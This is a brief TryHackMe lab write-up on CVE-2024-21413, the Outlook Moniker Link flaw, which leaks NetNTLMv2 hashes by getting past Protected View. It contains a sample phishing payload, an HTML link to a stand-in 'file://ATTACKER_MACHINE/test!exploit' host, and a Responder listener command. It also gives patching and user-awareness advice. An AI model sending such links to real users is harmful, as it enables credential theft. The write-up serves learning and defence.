# TryHackMe : Moniker Link
https://tryhackme.com/room/monikerlink

**Path:** Cyber Security 101
**Completed:** 17 April, 2026
**Difficulty:** Easy

## Overview
Leak user's credentials using CVE-2024-21413 to bypass Outlook's Protected View

## Key Skills Practised
- Sending an email with a Moniker Link as a HTML hyperlink
- Use of Responder to create an SMB listener on the attacking machine
- Creating a Python script to send the email

## Useful Commands / Tools
- The ! special character is used to bypass Outlook's Protected View by inserting it into a Moniker Link which leads to the victims Windows netNTLMv2 hash being sent to the attacker
- **responder -I ens5**

## Screenshots


## Takeaway for Security Roles
Given this exploit has an extremely low attack complexity and affects a large portion of users, it's essential to update Outlook through Windows Update or the MS Update Catalog as soon as possible, as there's no way to prevent Outlook's "Protected View" from being bypassed. 
An example of a Moniker Link in an email would be - <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
Do not click random links in emails
Preview links before clicking them
Report suspicious emails to the IT Security department
